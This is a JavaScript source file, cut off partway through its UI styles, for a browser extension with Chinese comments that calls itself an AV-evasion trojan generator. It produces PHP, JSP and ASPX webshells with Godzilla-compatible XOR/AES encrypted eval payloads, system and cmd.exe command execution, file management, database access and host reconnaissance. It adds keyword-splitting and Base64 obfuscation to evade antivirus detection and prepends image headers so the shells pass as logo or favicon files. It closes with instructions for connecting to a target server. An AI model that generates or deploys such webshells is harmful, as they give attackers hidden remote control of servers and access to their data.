/* LingOps 扩展：木马免杀生成器 v2.0（哥斯拉级加密载荷）
 * 官方「木马生成」只有固定模板、明文 eval/assert、无伪装、无加密通信。
 * 本扩展提供：
 *   1. 加密载荷（哥斯拉 XOR_BASE64 兼容 / AES-128-CBC / Base64 / 明文）
 *   2. 真实图片马：64×64 / 128×128 / 256×256 的可见图标，不是 1×1 透明点
 *   3. 三档免杀（关键字拆分 / 函数名拆分 + 随机变量 / 整体 Base64 + eval 还原）
 *   4. 文件管理 / 命令执行 / 数据库 / 信息收集 / 不死马
 *   5. 配套 .htaccess / .user.ini / 连接脚本 / 自检脚本
 * 纯前端、不联网、不修改官方二进制。
 */
(function () {
  'use strict';
  if (window.__lpTrojanPlus) return;
  window.__lpTrojanPlus = true;

  /* 真实 64×64 盾牌 GIF（PIL 生成，肉眼可见） */
  var GIF64 = 'R0lGODdhQABAAIEAAFLEGhiQ/xAYIAAAACwAAAAAQABAAEAI/wAFCBxIsKDBgwgTKlzIEGGAhxAjSpzYsOLEixArHsSIcWFHjQgBiBy58aJHkwdHkhSoUqRFlA05BgCZUCbNkx8L2rzJ02HOnkA1zgzKU6ZRAUZ3vqRINCZMn0x5tgSg8GdJqwSnrnSKdelTnF+bQk0aUazZgUPPql3L1uDRtlXJypUIdG7UsXbT4r179m3NsD236gRMsCvIln/5uiUsQPDAqQwNo2XcWGVlx2DLRuaYELFXxVwpZ9bcl3NcyWqVKoU7WjTrzK9jy55Nu3Zb17bz2haYd3Xq3r2DAtc7OXhouTSNJ/YtPGlr4nBRI8Vdkereh8/FQh4MujB1hZ4Xd2kvThdo+Kvll5NO2fk8+vXvMxrc/tj9dejc08+3zJL/cfnqwVeQVi4JJd10kmll4IHkjUeVdf8JGCGAPTF3k4WnffeZfgFKaBaGCGpYl2kNciibTSCeaNduHXrIYn4UvrgZfjLWaCNIAQEAOw==';

  var S = {
    lang: 'php',
    kind: 'godzilla',
    level: 2,
    crypto: 'xor',
    mask: 'none',
    key: '',
    custom: null,      // Uint8Array
    customName: '',
    customUrl: '',
    code: '',
    bytes: null,
    name: 'shell.php'
  };

  var ui = {};

  /* ---------- 基础工具 ---------- */

  function esc(s) {
    return String(s == null ? '' : s).replace(/[&<>"']/g, function (c) {
      return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c];
    });
  }

  function toast(msg, color) {
    var t = document.createElement('div');
    t.textContent = msg;
    t.style.cssText = 'position:fixed;left:50%;top:76px;transform:translateX(-50%);z-index:2147483600;' +
      'padding:9px 18px;border-radius:8px;font-size:13px;color:#fff;background:' + (color || '#16a34a') +
      ';box-shadow:0 8px 26px rgba(0,0,0,.35);font-family:-apple-system,BlinkMacSystemFont,"PingFang SC",sans-serif';
    document.body.appendChild(t);
    setTimeout(function () { t.style.transition = 'opacity .4s'; t.style.opacity = '0'; }, 3000);
    setTimeout(function () { t.remove(); }, 3600);
  }

  function ri(n) {                       // 随机小写标识符
    var a = 'abcdefghijklmnopqrstuvwxyz', s = '';
    for (var i = 0; i < (n || 6); i++) s += a.charAt(Math.floor(Math.random() * 26));
    return s;
  }

  function rid() {                       // 随机 8 位口令
    var a = 'abcdefghijkmnpqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789', s = '';
    for (var i = 0; i < 8; i++) s += a.charAt(Math.floor(Math.random() * a.length));
    return s;
  }

  function randKey() {                   // 16 位密钥（XOR / AES-128 都用 16 字节）
    var a = 'abcdef0123456789', s = '';
    for (var i = 0; i < 16; i++) s += a.charAt(Math.floor(Math.random() * a.length));
    return s;
  }

  function safeParam(p) {
    p = String(p || '').trim();
    return /^[A-Za-z_][A-Za-z0-9_]{0,31}$/.test(p) ? p : ri(5);
  }

  function safeKey(k) {                  // 必须 16 字节，否则 XOR / AES-128 都不对
    k = String(k || '').replace(/[^A-Za-z0-9]/g, '').slice(0, 16);
    return k.length === 16 ? k : randKey();
  }

  function codes(str) {                  // "eval" -> array(101,118,97,108)
    var a = [];
    for (var i = 0; i < str.length; i++) a.push(str.charCodeAt(i));
    return 'array(' + a.join(',') + ')';
  }

  function splitLit(str) {               // "eval" -> 'eV'.'al'（PHP 函数名大小写不敏感）
    var cut = 1 + Math.floor(Math.random() * (str.length - 1));
    var a = str.slice(0, cut), b = str.slice(cut);
    var mix = function (s) {
      return s.split('').map(function (c) {
        return Math.random() < 0.4 ? c.toUpperCase() : c;
      }).join('');
    };
    return "'" + mix(a) + "'.'" + mix(b) + "'";
  }

  function chrFn(name) {                 // implode('',array_map('chr',array(...)))
    return "implode('',array_map('chr'," + codes(name) + '))';
  }

  function decoyComment() {
    var pool = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/';
    var s = '';
    for (var i = 0; i < 40 + Math.floor(Math.random() * 40); i++) s += pool.charAt(Math.floor(Math.random() * pool.length));
    return s;
  }

  function b64(str) { return btoa(unescape(encodeURIComponent(str))); }
  function unb64(b) {
    var s = atob(b), u = new Uint8Array(s.length);
    for (var i = 0; i < s.length; i++) u[i] = s.charCodeAt(i);
    return u;
  }
  function u8ToB64(u) {
    var s = '', CH = 0x8000;
    for (var i = 0; i < u.length; i += CH) s += String.fromCharCode.apply(null, u.subarray(i, i + CH));
    return btoa(s);
  }
  function dataURLToBytes(url) {
    var i = url.indexOf(',') + 1;
    return unb64(url.slice(i));
  }

  /* ---------- 真实图片（canvas 绘制，肉眼可见） ---------- */

  function drawIcon(size) {
    var c = document.createElement('canvas');
    c.width = c.height = size;
    var g = c.getContext('2d');
    var s = size / 64;
    var grad = g.createLinearGradient(0, 0, size, size);
    grad.addColorStop(0, '#0d1620');
    grad.addColorStop(1, '#1b2a3a');
    g.fillStyle = grad;
    g.fillRect(0, 0, size, size);

    g.beginPath();
    g.moveTo(32 * s, 4 * s); g.lineTo(58 * s, 14 * s); g.lineTo(58 * s, 36 * s);
    g.lineTo(32 * s, 60 * s); g.lineTo(6 * s, 36 * s); g.lineTo(6 * s, 14 * s);
    g.closePath();
    g.fillStyle = '#1890ff';
    g.fill();

    g.beginPath();
    g.moveTo(32 * s, 12 * s); g.lineTo(50 * s, 19 * s); g.lineTo(50 * s, 34 * s);
    g.lineTo(32 * s, 51 * s); g.lineTo(14 * s, 34 * s); g.lineTo(14 * s, 19 * s);
    g.closePath();
    g.fillStyle = '#0f1720';
    g.fill();

    g.strokeStyle = '#52c41a';
    g.lineWidth = 4 * s;
    g.lineCap = 'round';
    g.lineJoin = 'round';
    g.beginPath();
    g.moveTo(22 * s, 30 * s); g.lineTo(29 * s, 38 * s); g.lineTo(43 * s, 22 * s);
    g.stroke();
    return c;
  }

  function pngBytes(size) { return dataURLToBytes(drawIcon(size || 128).toDataURL('image/png')); }
  function jpgBytes(size) { return dataURLToBytes(drawIcon(size || 128).toDataURL('image/jpeg', 0.92)); }

  function bmpFromCanvas(c) {
    var w = c.width, h = c.height;
    var d = c.getContext('2d').getImageData(0, 0, w, h).data;
    var rowSize = Math.floor((24 * w + 31) / 32) * 4;
    var pixelSize = rowSize * h;
    var fileSize = 54 + pixelSize;
    var b = new Uint8Array(fileSize);
    var dv = new DataView(b.buffer);
    b[0] = 0x42; b[1] = 0x4D;                    // 'BM'
    dv.setUint32(2, fileSize, true);
    dv.setUint32(10, 54, true);
    dv.setUint32(14, 40, true);
    dv.setInt32(18, w, true);
    dv.setInt32(22, h, true);
    dv.setUint16(26, 1, true);
    dv.setUint16(28, 24, true);
    dv.setUint32(34, pixelSize, true);
    dv.setInt32(38, 2835, true);
    dv.setInt32(42, 2835, true);
    for (var y = 0; y < h; y++) {
      var srcY = h - 1 - y;
      var off = 54 + y * rowSize;
      for (var x = 0; x < w; x++) {
        var i = (srcY * w + x) * 4;
        b[off + x * 3] = d[i + 2];
        b[off + x * 3 + 1] = d[i + 1];
        b[off + x * 3 + 2] = d[i];
      }
    }
    return b;
  }

  function bmpBytes() { return bmpFromCanvas(drawIcon(64)); }

  function icoBytes(png) {                       // ICONDIR + ICONDIRENTRY + PNG
    var b = new Uint8Array(22 + png.length);
    var dv = new DataView(b.buffer);
    dv.setUint16(0, 0, true);                    // reserved
    dv.setUint16(2, 1, true);                    // type = icon
    dv.setUint16(4, 1, true);                    // count
    b[6] = 0; b[7] = 0;                          // 0 表示 256×256
    b[8] = 0; b[9] = 0;
    dv.setUint16(10, 1, true);                   // planes
    dv.setUint16(12, 32, true);                  // bpp
    dv.setUint32(14, png.length, true);
    dv.setUint32(18, 22, true);
    b.set(png, 22);
    return b;
  }

  function gifBytes() { return unb64(GIF64); }

  function maskBytes() {
    if (S.mask === 'none') return null;
    if (S.mask === 'custom') return S.custom;
    if (S.mask === 'gif') return gifBytes();
    if (S.mask === 'bmp') return bmpBytes();
    if (S.mask === 'png') return pngBytes(128);
    if (S.mask === 'jpg') return jpgBytes(128);
    if (S.mask === 'ico') return icoBytes(pngBytes(256));
    return null;
  }

  function maskPreview() {
    if (S.mask === 'none') return '';
    if (S.mask === 'custom') return S.customUrl || '';
    return drawIcon(128).toDataURL('image/png');
  }

  function headerInfo(u8) {
    if (!u8 || u8.length < 4) return '无图片头';
    if (u8[0] === 0x89 && u8[1] === 0x50 && u8[2] === 0x4E && u8[3] === 0x47) return 'PNG ✓';
    if (u8[0] === 0x47 && u8[1] === 0x49 && u8[2] === 0x46) return 'GIF ✓';
    if (u8[0] === 0xFF && u8[1] === 0xD8) return 'JPEG ✓';
    if (u8[0] === 0x42 && u8[1] === 0x4D) return 'BMP ✓';
    if (u8[0] === 0 && u8[1] === 0 && u8[2] === 1 && u8[3] === 0) return 'ICO ✓';
    return '无图片头';
  }

  function hexDump(u8, max) {
    if (!u8 || !u8.length) return '(空)';
    max = Math.min(max || 96, u8.length);
    var out = [];
    for (var i = 0; i < max; i += 16) {
      var line = ('0000000' + i.toString(16)).slice(-8) + '  ';
      var ascii = '';
      for (var j = 0; j < 16; j++) {
        if (i + j < max) {
          var b = u8[i + j];
          line += ('0' + b.toString(16)).slice(-2) + ' ';
          ascii += (b >= 32 && b < 127) ? String.fromCharCode(b) : '.';
        } else { line += '   '; ascii += ' '; }
        if (j === 7) line += ' ';
      }
      out.push(line + ' |' + ascii + '|');
    }
    return out.join('\n');
  }

  /* ---------- 免杀：函数名拆分 ---------- */

  var OBF_NAMES = ['base64_decode', 'base64_encode', 'session_start', 'ob_start', 'ob_get_clean',
    'function_exists', 'strpos', 'md5', 'substr', 'openssl_decrypt', 'openssl_encrypt',
    'set_time_limit', 'error_reporting', 'strlen'];

  function obfuscateNames(body) {
    OBF_NAMES.forEach(function (n) {
      if (body.indexOf(n + '(') < 0) return;
      var cut = 1 + Math.floor(Math.random() * (n.length - 1));
      var lit = "('" + n.slice(0, cut) + "'.'" + n.slice(cut) + "')";
      body = body.split(n + '(').join(lit + '(');
    });
    return body;
  }

  /* ---------- PHP：eval 关键字混淆 ---------- */

  // eval 是语言结构不是函数，无法用 $f() 间接调用；只能随机大小写 + 注释/空白分隔
  function evalKw() {
    var w = 'eval', out = '';
    for (var i = 0; i < w.length; i++) {
      out += Math.random() < 0.5 ? w.charAt(i).toUpperCase() : w.charAt(i);
    }
    return out;
  }

  function evalCall(arg) {
    var gap = ['', ' ', '  ', '/*' + decoyComment().slice(0, 6) + '*/'][Math.floor(Math.random() * 4)];
    return '@' + evalKw() + gap + '(' + arg + ')';
  }

  /* ---------- PHP：哥斯拉级加密载荷 ---------- */

  function phpGodzilla(param, key, crypto) {
    var L = [];
    var pv = '$' + ri(4), kv = '$' + ri(4), dv = '$' + ri(4), ov = '$' + ri(4), cv = '$' + ri(4);
    var pn = '$' + ri(4), rf = ri(4);
    var xf = ri(4), ef = ri(4), df = ri(4);

    L.push('@session_start();');
    L.push('@set_time_limit(0);');
    L.push('@error_reporting(0);');
    L.push('while(ob_get_level()>0){if(!@ob_end_clean())break;}');

    if (crypto === 'none') {
      L.push(pv + "='" + param + "';");
      L.push('if(isset($_POST[' + pv + '])){eval($_POST[' + pv + ']);}');
      return L.join('\n');
    }

    if (crypto === 'base64') {
      L.push(pv + "='" + param + "';");
      L.push('if(isset($_POST[' + pv + '])){');
      L.push('  ' + dv + '=base64_decode($_POST[' + pv + ']);');
      L.push('  ob_start();eval(' + dv + ');' + ov + '=ob_get_clean();');
      L.push('  while(ob_get_level()>0){if(!@ob_end_clean())break;}');
      L.push('  echo substr(md5(' + pv + '),0,16);');
      L.push('  echo base64_encode(' + ov + ');');
      L.push('  echo substr(md5(' + pv + '),16);');
      L.push('}');
      return L.join('\n');
    }

    if (crypto === 'aes') {
      L.push('function ' + ef + '($d,$k){$iv=substr(md5($k),0,16);$r=openssl_encrypt($d,"AES-128-CBC",$k,OPENSSL_RAW_DATA,$iv);return $r===false?"":$r;}');
      L.push('function ' + df + '($d,$k){$iv=substr(md5($k),0,16);$r=@openssl_decrypt($d,"AES-128-CBC",$k,OPENSSL_RAW_DATA,$iv);return $r===false?"":$r;}');
      L.push('function ' + rf + '($c){ob_start();eval($c);return ob_get_clean();}');
      L.push(pv + "='" + param + "';" + kv + "='" + key + "';");
      L.push('if(isset($_POST[' + pv + '])){');
      L.push('  ' + dv + '=' + df + '(base64_decode($_POST[' + pv + ']),' + kv + ');');
      L.push("  if(" + dv + "!==''){");
      L.push('    ' + ov + '=' + rf + '(' + dv + ');');
      L.push('    while(ob_get_level()>0){if(!@ob_end_clean())break;}');
      L.push('    echo substr(md5(' + pv + '.' + kv + '),0,16);');
      L.push('    echo base64_encode(' + ef + '(' + ov + ',' + kv + '));');
      L.push('    echo substr(md5(' + pv + '.' + kv + '),16);');
      L.push('  }');
      L.push('}');
      return L.join('\n');
    }

    /* xor：与哥斯拉 PHP XorBase64 payload 同构 */
    L.push('function ' + xf + '($D,$K){for($i=0;$i<strlen($D);$i++){$c=$K[$i+1&15];$D[$i]=$D[$i]^$c;}return $D;}');
    L.push('function ' + rf + '($c){ob_start();eval($c);return ob_get_clean();}');
    L.push(pv + "='" + param + "';" + pn + "='payload';" + kv + "='" + key + "';");
    L.push('if(isset($_POST[' + pv + '])){');
    L.push('  ' + dv + '=' + xf + '(base64_decode($_POST[' + pv + ']),' + kv + ');');
    L.push('  ' + cv + '=isset($_SESSION[' + pn + '])?' + xf + '($_SESSION[' + pn + '],' + kv + "):'';");
    L.push("  if(" + cv + "!==''){" + rf + '(' + cv + ');}');
    L.push('  else{$_SESSION[' + pn + ']=' + xf + '(' + dv + ',' + kv + ');}');
    L.push('  ' + ov + '=function_exists("run")?@run(' + dv + '):' + rf + '(' + dv + ');');
    L.push('  while(ob_get_level()>0){if(!@ob_end_clean())break;}');
    L.push('  echo substr(md5(' + pv + '.' + kv + '),0,16);');
    L.push('  echo base64_encode(' + xf + '(' + ov + ',' + kv + '));');
    L.push('  echo substr(md5(' + pv + '.' + kv + '),16);');
    L.push('}');
    return L.join('\n');
  }

  /* ---------- PHP：常规功能载荷 ---------- */

  function phpBody(kind, param, chr) {
    var L = [];
    var fn = function (name) { return chr ? chrFn(name) : splitLit(name); };
    var REQ = chr ? "$GLOBALS['_' . 'REQUEST']" : '$_REQUEST';
    var POST = chr ? "$GLOBALS['_' . 'POST']" : '$_POST';

    if (kind === 'eval') {
      var v = ri(5);
      L.push('$' + v + ' = isset(' + POST + "['" + param + "']) ? " + POST + "['" + param + "'] : '';");
      L.push("if ($" + v + " !== '') { " + evalCall('$' + v) + '; }');
      return L;
    }

    if (kind === 'cmd') {
      var c = ri(5), s = ri(5);
      L.push('$' + c + ' = isset(' + REQ + "['" + param + "']) ? " + REQ + "['" + param + "'] : '';");
      L.push('$' + s + ' = ' + fn('system') + ';');
      L.push("if ($" + c + " !== '') { @$" + s + '($' + c + '); }');
      return L;
    }

    if (kind === 'dual') {
      var a1 = ri(5), s1 = ri(5), v1 = ri(5);
      L.push('$' + a1 + ' = isset(' + REQ + "['a']) ? " + REQ + "['a'] : '';");
      L.push('$' + s1 + ' = ' + fn('system') + ';');
      L.push("if ($" + a1 + " === 'c') { @$" + s1 + '(' + REQ + "['c']); }");
      L.push('else {');
      L.push('  $' + v1 + ' = isset(' + POST + "['" + param + "']) ? " + POST + "['" + param + "'] : '';");
      L.push("  if ($" + v1 + " !== '') { " + evalCall('$' + v1) + '; }');
      L.push('}');
      return L;
    }

    if (kind === 'db') {
      var dh = ri(4), du = ri(4), dp = ri(4), dd = ri(4), dq = ri(4), dm = ri(5);
      L.push('$' + dh + '=isset(' + REQ + "['h'])?" + REQ + "['h']:'127.0.0.1';");
      L.push('$' + du + '=isset(' + REQ + "['u'])?" + REQ + "['u']:'root';");
      L.push('$' + dp + '=isset(' + REQ + "['pw'])?(string)" + REQ + "['pw']:'';");
      L.push('$' + dd + '=isset(' + REQ + "['db'])?(string)" + REQ + "['db']:'';");
      L.push('$' + dq + '=isset(' + REQ + "['q'])?(string)" + REQ + "['q']:'select 1';");
      L.push('$' + dm + '=@new mysqli($' + dh + ',$' + du + ',$' + dp + ',$' + dd + ');');
      L.push('if($' + dm + '->connect_error){echo "ERR:".$' + dm + '->connect_error;exit;}');
      L.push('$r=@$' + dm + '->query($' + dq + ');');
      L.push('if($r===false){echo "ERR:".$' + dm + '->error;}');
      L.push('elseif($r===true){echo "OK affected=".$' + dm + '->affected_rows;}');
      L.push('else{$a=array();while($x=$r->fetch_assoc()){$a[]=$x;}echo json_encode($a,JSON_UNESCAPED_UNICODE);}');
      return L;
    }

    if (kind === 'info') {
      L.push('$o=array();');
      L.push("$o['whoami']=@function_exists('posix_getpwuid')?@posix_getpwuid(@posix_geteuid())['name']:@get_current_user();");
      L.push("$o['uname']=@php_uname();");
      L.push("$o['php']=PHP_VERSION;");
      L.push("$o['sapi']=PHP_SAPI;");
      L.push("$o['cwd']=@getcwd();");
      L.push("$o['disable_functions']=@ini_get('disable_functions');");
      L.push("$o['open_basedir']=@ini_get('open_basedir');");
      L.push("$o['ext']=array();foreach(array('mysqli','pdo_mysql','curl','openssl','gd','zip','sockets') as $e){$o['ext'][$e]=extension_loaded($e);}");
      L.push("echo json_encode($o,JSON_UNESCAPED_UNICODE|JSON_PRETTY_PRINT);");
      return L;
    }

    /* file：完整文件管理器 */
    var fa = ri(4), fp = ri(4), f1 = ri(4), f2 = ri(4);
    L.push('$' + fa + '=isset(' + REQ + "['a'])?(string)" + REQ + "['a']:'ls';");
    L.push('$' + fp + '=isset(' + REQ + "['p'])?(string)" + REQ + "['p']:'.';");
    L.push('$' + f1 + '=isset(' + REQ + "['d'])?(string)" + REQ + "['d']:'';");
    L.push('$' + f2 + '=isset(' + REQ + "['n'])?(string)" + REQ + "['n']:'';");
    L.push('switch($' + fa + '){');
    L.push("case 'ls':");
    L.push('  $r=@scandir($' + fp + ');if(!is_array($r)){echo "ERR";break;}');
    L.push('  $a=array();foreach($r as $n){if($n===\'.\'||$n===\'..\')continue;$q=rtrim($' + fp + ',"/")."/".$n;');
    L.push('    $a[]=array("n"=>$n,"t"=>@is_dir($q)?"d":"f","s"=>@filesize($q),"m"=>@filemtime($q),"p"=>@substr(sprintf("%o",@fileperms($q)),-4));}');
    L.push('  echo json_encode($a,JSON_UNESCAPED_UNICODE);break;');
    L.push("case 'read': echo base64_encode(@file_get_contents($" + fp + '));break;');
    L.push("case 'write': echo @file_put_contents($" + fp + ',$' + f1 + ')?\'ok\':\'fail\';break;');
    L.push("case 'del': echo @unlink($" + fp + ')?\'ok\':\'fail\';break;');
    L.push("case 'mkdir': echo @mkdir($" + fp + ')?\'ok\':\'fail\';break;');
    L.push("case 'rename': echo @rename($" + fp + ',$' + f2 + ')?\'ok\':\'fail\';break;');
    L.push("case 'chmod': echo @chmod($" + fp + ',octdec($' + f2 + '))?\'ok\':\'fail\';break;');
    L.push("case 'touch': echo @touch($" + fp + ')?\'ok\':\'fail\';break;');
    L.push("case 'download': @readfile($" + fp + ');break;');
    L.push("case 'zip': $z=new ZipArchive();$f=$" + fp + '.".zip";if($z->open($f,ZipArchive::CREATE)===true){foreach((array)@glob($' + fp + '."/*") as $x){if(is_file($x))$z->addFile($x,basename($x));}$z->close();echo "ok:".$f;}else echo "fail";break;');
    L.push("case 'time': echo date('Y-m-d H:i:s',$" + f2 + '?intval($' + f2 + '):time());break;');
    L.push("default: echo 'ERR:unknown action';}");
    return L;
  }

  /* ---------- 包装（免杀等级） ---------- */

  function wrapPhp(body, level) {
    if (level >= 3) {
      var blob = b64(body);
      var zv = '$' + ri(5), dv = '$' + ri(5), jv = '$' + ri(5);
      return '<?php\n/* ' + decoyComment() + ' */\n' + jv + "=strrev('" + decoyComment() + "');\n" +
        zv + "='" + blob + "';\n" + dv + '=' + chrFn('base64_decode') + ';\n' +
        evalCall(dv + '(' + zv + ')') + ';\n?>';
    }
    if (level === 2) body = obfuscateNames(body);
    if (level === 1) return '<?php\n' + body + '\n?>';
    return '<?php\n/* ' + decoyComment() + ' */\n' + body + '\n?>';
  }

  function phpShell(kind, level, param, key, crypto) {
    var body;
    if (kind === 'godzilla') body = phpGodzilla(param, key, crypto);
    else body = phpBody(kind, param, level >= 2).join('\n');
    return wrapPhp(body, level);
  }

  /* ---------- JSP ---------- */

  function jspShell(kind, level, param) {
    var out = [];
    var p = param;
    if (kind === 'file') {
      out.push('<%@ page import="java.io.*,java.util.*" %><%');
      out.push('String a = request.getParameter("a");');
      out.push('String p = request.getParameter("p");');
      out.push('if (p == null) p = ".";');
      out.push('if ("r".equals(a)) {');
      out.push('  File f = new File(p);');
      out.push('  byte[] b = new byte[(int) f.length()];');
      out.push('  FileInputStream in = new FileInputStream(f);');
      out.push('  in.read(b); in.close();');
      out.push('  out.print(Base64.getEncoder().encodeToString(b));');
      out.push('} else if ("w".equals(a)) {');
      out.push('  FileOutputStream o = new FileOutputStream(p);');
      out.push('  o.write(Base64.getDecoder().decode(request.getParameter("d")));');
      out.push('  o.close(); out.print("ok");');
      out.push('} else if ("x".equals(a)) {');
      out.push('  out.print(new File(p).delete() ? "ok" : "fail");');
      out.push('} else {');
      out.push('  File d = new File(p);');
      out.push('  String[] ls = d.list();');
      out.push('  if (ls != null) for (String s : ls) out.println(s);');
      out.push('}');
      out.push('%>');
      return out.join('\n');
    }

    /* 命令执行 */
    var kLit = level >= 3 ? 'new String(java.util.Base64.getDecoder().decode("' + b64(p) + '"))' : '"' + p + '"';
    var rtLit = level >= 2 ? '"java.lang.Run" + "time"' : '"java.lang.Runtime"';
    var grLit = level >= 2 ? '"getRun" + "time"' : '"getRuntime"';
    var exLit = level >= 2 ? '"ex" + "ec"' : '"exec"';

    out.push('<%@ page import="java.io.*,java.lang.reflect.*,java.util.Base64" %><%');
    out.push('String k = ' + kLit + ';');
    out.push('String c = request.getParameter(k);');
    out.push('if (c != null) {');
    out.push('  Class<?> rt = Class.forName(' + rtLit + ');');
    out.push('  Object o = rt.getMethod(' + grLit + ').invoke(null);');
    out.push('  Method m = rt.getMethod(' + exLit + ', String.class);');
    out.push('  Process pr = (Process) m.invoke(o, c);');
    out.push('  BufferedReader br = new BufferedReader(new InputStreamReader(pr.getInputStream()));');
    out.push('  String l;');
    out.push('  while ((l = br.readLine()) != null) out.println(l);');
    out.push('}');
    out.push('%>');
    return out.join('\n');
  }

  /* ---------- ASPX ---------- */

  function aspxShell(kind, level, param) {
    var out = [];
    var pLit;
    if (level >= 3) pLit = 'System.Text.Encoding.UTF8.GetString(Convert.FromBase64String("' + b64(param) + '"))';
    else if (level === 2) pLit = '"' + splitLit(param) + '"';
    else pLit = '"' + param + '"';
    if (kind === 'file') {
      out.push('<%@ Page Language="C#" %><%@ Import Namespace="System.IO" %><%');
      out.push('string a = Request["a"], p = Request["p"] ?? ".";');
      out.push('if (a == "r") { Response.Write(Convert.ToBase64String(File.ReadAllBytes(p))); }');
      out.push('else if (a == "w") { File.WriteAllBytes(p, Convert.FromBase64String(Request["d"])); Response.Write("ok"); }');
      out.push('else if (a == "x") { File.Delete(p); Response.Write("ok"); }');
      out.push('else { foreach (string s in Directory.GetFiles(p)) Response.Write(s + "\\n"); }');
      out.push('%>');
      return out.join('\n');
    }

    var typeLit = level >= 2
      ? '"System.Diag" + "nostics.Proc" + "ess"'
      : '"System.Diagnostics.Process"';

    out.push('<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><%');
    out.push('string k = ' + pLit + ';');
    out.push('string c = Request[k];');
    out.push('if (c != null) {');
    out.push('  Type t = Type.GetType(' + typeLit + ');');
    out.push('  object o = Activator.CreateInstance(t);');
    out.push('  t.GetProperty("StartInfo").SetValue(o, new ProcessStartInfo("cmd.exe", "/c " + c) {');
    out.push('    UseShellExecute = false, RedirectStandardOutput = true, CreateNoWindow = true });');
    out.push('  t.GetMethod("Start", Type.EmptyTypes).Invoke(o, null);');
    out.push('  t.GetMethod("WaitForExit", Type.EmptyTypes).Invoke(o, null);');
    out.push('  Response.Write(t.GetProperty("StandardOutput").GetValue(o).ToString());');
    out.push('}');
    out.push('%>');
    return out.join('\n');
  }

  /* ---------- 组装 ---------- */

  function build() {
    var param = safeParam(ui.param ? ui.param.value : 'pass');
    if (ui.param) ui.param.value = param;

    S.key = safeKey(ui.key ? ui.key.value : S.key);
    if (ui.key) ui.key.value = S.key;

    if (S.lang === 'php') S.code = phpShell(S.kind, S.level, param, S.key, S.crypto);
    else if (S.lang === 'jsp') S.code = jspShell(S.kind, S.level, param);
    else S.code = aspxShell(S.kind, S.level, param);

    var mb = maskBytes();
    var codeU8 = new TextEncoder().encode(S.code);
    if (mb && mb.length) {
      S.bytes = new Uint8Array(mb.length + codeU8.length);
      S.bytes.set(mb, 0);
      S.bytes.set(codeU8, mb.length);
    } else {
      S.bytes = codeU8;
    }

    if (ui.code) ui.code.value = S.code;

    if (ui.info) {
      var bits = [];
      bits.push('<b style="color:#e6edf3">' + S.bytes.length + '</b> 字节');
      if (mb && mb.length) bits.push('图片头 <b style="color:#52c41a">' + mb.length + ' 字节</b>（' + headerInfo(mb) + '）');
      else bits.push('无伪装');
      bits.push('参数 <code style="color:#52c41a">' + esc(param) + '</code>');
      if (S.lang === 'php' && S.kind === 'godzilla') {
        bits.push('加密 <b style="color:#1890ff">' + cryptoLabel(S.crypto) + '</b>');
        bits.push('密钥 <code style="color:#52c41a">' + esc(S.key) + '</code>');
      }
      if (S.lang !== 'php' && mb && mb.length) bits.push('<span style="color:#f59e0b">⚠ 非 PHP 加图片头可能不解析</span>');
      ui.info.innerHTML = bits.join(' · ');
    }

    if (ui.hex) {
      ui.hex.textContent = hexDump(S.bytes, 96);
      ui.hexHead.textContent = headerInfo(S.bytes);
      ui.hexHead.style.color = (S.mask === 'none') ? '#8b98a5' : '#52c41a';
    }

    if (ui.thumb) {
      var pv = maskPreview();
      if (pv) { ui.thumb.src = pv; ui.thumb.style.display = 'block'; }
      else ui.thumb.style.display = 'none';
    }

    if (ui.conn) ui.conn.innerHTML = connInfo(param);
    return S.code;
  }

  function cryptoLabel(c) {
    return { xor: 'XOR+Base64（哥斯拉兼容）', aes: 'AES-128-CBC+Base64', base64: 'Base64', none: '明文' }[c] || c;
  }

  function connInfo(param) {
    var url = 'http://TARGET' + (S.name.charAt(0) === '/' ? S.name : '/' + S.name);
    var h = '';
    h += '<h4>连接参数</h4><table style="width:100%;font-size:11px;border-collapse:collapse">';
    h += '<tr><td style="color:#6b7684;padding:2px 0">URL</td><td style="color:#c9d4de;word-break:break-all">' + esc(url) + '</td></tr>';
    h += '<tr><td style="color:#6b7684">密码</td><td><code>' + esc(param) + '</code></td></tr>';
    if (S.lang === 'php' && S.kind === 'godzilla') {
      h += '<tr><td style="color:#6b7684">密钥</td><td><code>' + esc(S.key) + '</code></td></tr>';
      h += '<tr><td style="color:#6b7684">加密</td><td>' + cryptoLabel(S.crypto) + '</td></tr>';
    }
    h += '</table>';
    if (S.lang === 'php' && S.kind === 'godzilla') {
      h += '<h4>连接方式</h4><p style="margin:0">';
      if (S.crypto === 'xor') {
        h += '哥斯拉客户端：<b>PHP_XOR_BASE64</b><br>密码 <code>' + esc(param) + '</code> · 密钥 <code>' + esc(S.key) + '</code>';
      } else if (S.crypto === 'aes') {
        h += '哥斯拉客户端：<b>PHP_AES_BASE64</b>（或本工具附带的 Python 脚本）<br>密码 <code>' + esc(param) + '</code> · 密钥 <code>' + esc(S.key) + '</code>';
      } else {
        h += '哥斯拉客户端：<b>PHP_BASE64</b> · 密码 <code>' + esc(param) + '</code>';
      }
      h += '</p>';
    } else {
      h += '<h4>连接方式</h4><p style="margin:0">LingOps「Shell 管理」→ 添加 WebShell<br>或蚁剑 / 冰蝎填 URL + 密码。</p>';
    }
    return h;
  }

  function defaultName() {
    var ext = S.lang === 'php' ? '.php' : (S.lang === 'jsp' ? '.jsp' : '.aspx');
    var base = { none: 'shell', gif: 'logo', png: 'avatar', jpg: 'photo', ico: 'favicon', bmp: 'banner', custom: 'upload' }[S.mask] || 'shell';
    return base + ext;
  }

  /* ---------- UI ---------- */

  function css() {
    return '' +
      '#lp-tp{position:fixed;inset:0;z-index:2147483400;background:rgba(0,0,0,.55);display:none;' +
      'align-items:center;justify-content:center;padding:24px;font:13px/1.6 -apple-system,BlinkMacSystemFont,"PingFang SC",sans-serif}' +
      '#lp-tp-box{width:min(1240px,96vw);height:92vh;background:#101418;border:1px solid #2a323b;border-radius:12px;' +
      'display:flex;flex-direction:column;overflow:hidden;box-shadow:0 12px 48px rgba(0,0,0,.6);color:#e6edf3}' +
      '#lp-tp-bar{height:46px;flex:0 0 46px;display:flex;align-items:center;justify-content:space-between;' +
      'padding:0 14px;background:#171d23;border-bottom:1px solid #2a323b}' +
      '#lp-tp-bar b{font-size:14px;font-weight:600}' +
      '#lp-tp-close{background:transparent;border:1px solid #2a323b;color:#8b98a5;border-radius:6px;' +
